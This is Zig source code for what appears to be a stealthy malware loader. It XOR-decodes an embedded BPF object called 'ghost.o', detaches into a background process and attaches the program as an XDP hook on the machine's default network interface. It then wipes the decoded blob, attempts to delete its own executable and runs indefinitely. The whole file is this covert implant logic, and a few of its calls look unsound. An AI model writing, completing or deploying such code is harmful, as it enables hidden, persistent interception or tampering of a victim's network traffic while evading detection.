const std = @import("std");
const sc = @import("syscalls.zig");

pub fn _start() noreturn {
    var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
    inline for (0..bpf_blob.len) |idx| { bpf_blob[idx] ^= 0x7A; }

    const e_shoff = @as(*u64, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 40)).*;
    const e_shentsize = @as(*u16, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 58)).*;
    const e_shnum = @as(*u16, @ptrFromInt(@intFromPtr(bpf_blob.ptr) + 60)).*;
    
    var insns_ptr: usize = 0;
    var insns_cnt: u32 = 0;

    for (0..e_shnum) |i| {
        const shdr_ptr = @intFromPtr(bpf_blob.ptr) + e_shoff + (i * e_shentsize);
        if (@as(*u32, @ptrFromInt(shdr_ptr + 4)).* == 1) { 
            const sh_size = @as(*u64, @ptrFromInt(shdr_ptr + 32)).*;
            if (sh_size > 0) {
                insns_ptr = @intFromPtr(bpf_blob.ptr) + @as(*u64, @ptrFromInt(shdr_ptr + 24)).*;
                insns_cnt = @intCast(sh_size / 8);
                break;
            }
        }
    }

    const iface_idx = find_default_iface();

    const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
    const child = sc.clone(0x00000100 | 17, stack + 65536);
    if (child != 0) sc.exit(0);

    const attr = sc.bpf_attr_load{
        .prog_type = 6,
        .insn_cnt = insns_cnt,
        .insns = insns_ptr,
        .license = @intFromPtr("GPL"),
        .log_level = 0,
    };

    const prog_fd = sc.bpf_syscall(5, &attr, 128);
    
    // Heap Scrubbing: Securely erase the BPF blob from memory
    @memset(bpf_blob, 0);

    const link_attr = sc.bpf_attr_link{
        .prog_fd = @intCast(prog_fd),
        .target_ifindex = iface_idx,
        .attach_type = 37,
    };

    _ = sc.bpf_syscall(28, &link_attr, 64);
    _ = sc.unlink("/proc/self/exe");

    while (true) { _ = sc.nanosleep(3600); }
}

fn find_default_iface() u32 {
    var buf: [1024]u8 = undefined;
    const fd = sc.open("/proc/net/route", 0);
    if (fd < 0) return 2;
    const bytes = sc.read(@intCast(fd), &buf, 1024);
    _ = sc.close(@intCast(fd));

    var lines = std.mem.tokenize(u8, buf[0..@intCast(bytes)], "\n");
    _ = lines.next(); 

    while (lines.next()) |line| {
        var parts = std.mem.tokenize(u8, line, "\t ");
        const name = parts.next() orelse continue;
        const dest = parts.next() orelse continue;
        if (std.mem.eql(u8, dest, "00000000")) {
            return get_ifindex(name);
        }
    }
    return 2;
}

fn get_ifindex(name: []const u8) u32 {
    var path_buf: [64]u8 = undefined;
    const path = std.fmt.bufPrintZ(&path_buf, "/sys/class/net/{s}/ifindex", .{name}) catch return 2;
    const fd = sc.open(path, 0);
    if (fd < 0) return 2;
    var out: [8]u8 = undefined;
    const bytes = sc.read(@intCast(fd), &out, 8);
    _ = sc.close(@intCast(fd));
    return std.fmt.parseInt(u32, std.mem.trim(u8, out[0..@intCast(bytes)], "\n "), 10) catch 2;
}
